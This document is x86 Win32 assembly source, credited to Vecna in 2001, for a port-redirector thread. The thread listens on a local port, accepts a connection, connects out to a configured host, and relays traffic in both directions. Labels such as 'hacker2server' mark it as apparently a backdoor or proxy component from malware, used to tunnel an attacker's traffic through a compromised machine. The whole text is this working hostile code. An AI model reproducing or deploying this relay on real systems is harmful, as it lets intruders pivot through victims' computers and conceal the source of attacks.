;(c) Vecna 2001

work_thread:
       sub ebp, ebp
       mov edi, [esp+4]
       push ebp
       push ebp
       push ebp
       push ebp
       mov esi, esp
       push byte IPPROTO_TCP
       push byte SOCK_STREAM
       push byte PF_INET
       call dword [socket]
       mov [edi+20], eax
       inc eax
       jz .jmp2restart2
       mov eax, [edi+4]
       xchg al, ah
       mov word [esi+2], ax
       mov word [esi+0], PF_INET
       push byte 16
       push esi
       push dword [edi+20]
       call dword [bind]
       test eax, eax
       jnz .jmp2error_close
       push byte 3
       push dword [edi+20]
       call dword [listen]
       test eax, eax
       jz .zkip
  .jmp2error_close:
       jmp .error_close
  .zkip:
       push ebp
       push ebp
       push dword [edi+20]
       call dword [accept]
       mov ebx, eax
       inc eax
       jz .jmp2error_close
       xchg [edi+20], ebx
       push ebx
       call dword [closesocket]
       push byte IPPROTO_TCP
       push byte SOCK_STREAM
       push byte PF_INET
       call dword [socket]
       mov [edi+24], eax
       inc eax
  .jmp2restart2:
       jz near .jmp2restart
       mov eax, [edi+12]
       xchg al, ah
       mov word [esi+2], ax
       mov eax, [edi+8]
       bswap eax
       mov [esi+4], eax
       push byte 16
       push esi
       push dword [edi+24]
       call dword [connect]
       test eax, eax
       jnz .jmp2error_close2
       push dword 4*1024
       push byte 40h
       call dword [GlobalAlloc]
       test eax, eax
       jnz .zkip2
  .jmp2error_close2:
       jmp .error_close2
  .zkip2:
       mov esi, eax
       mov [edi+28], eax

  .redirecting:
       mov eax, [edi+20]
       call .check_socket
       jc .no_hacker2server
       push dword [edi+20]
       push dword [edi+24]
       jmp_ .do_read_write
  .no_hacker2server:
       mov eax, [edi+24]
       call .check_socket
       jc .no_server2hacker
       push dword [edi+24]
       push dword [edi+20]
  .do_read_write:
       call .read_write
       test eax, eax
       jz .error_freemem
  .no_server2hacker:
       jmp_ .redirecting

  .check_socket:
       pushad
       push eax
       push byte 1
       mov ebx, esp
       push byte 100
       push ebp
       push esp
       push ebp
       push ebp
       push ebx
       push ebp
       call dword [select]
       add esp, byte 16
       test eax, eax
       jz .socket_empty
       dec eax
       jz .socket_full
       db 0cch
       popad
       pop eax
  .error_freemem:
       push esi
       call dword [GlobalFree]
  .error_close2:
       push dword [edi+24]
       call dword [closesocket]
       mov [edi+24], ebp
  .error_close:
       push dword [edi+20]
       call dword [closesocket]
  .jmp2restart:
       add esp, byte 16
       jmp work_thread
  .socket_full:
       db 0a8h
  .socket_empty:
       stc
       popad
       ret

  .read_write:
       pushad
  .next_block:
       push ebp
       push dword 4*1024
       push esi
       push dword [esp+8*4+3*4+8]
       call dword [recv]
       inc eax
       jz .return
       dec eax
       push ebp
       push eax
       push esi
       push dword [esp+8*4+3*4+4]
       call dword [send]
       inc eax
       jz .return
       sub eax, 4*1024
       jz .next_block
  .return:
       mov [esp+7*4], eax
       popad
       ret 4*2

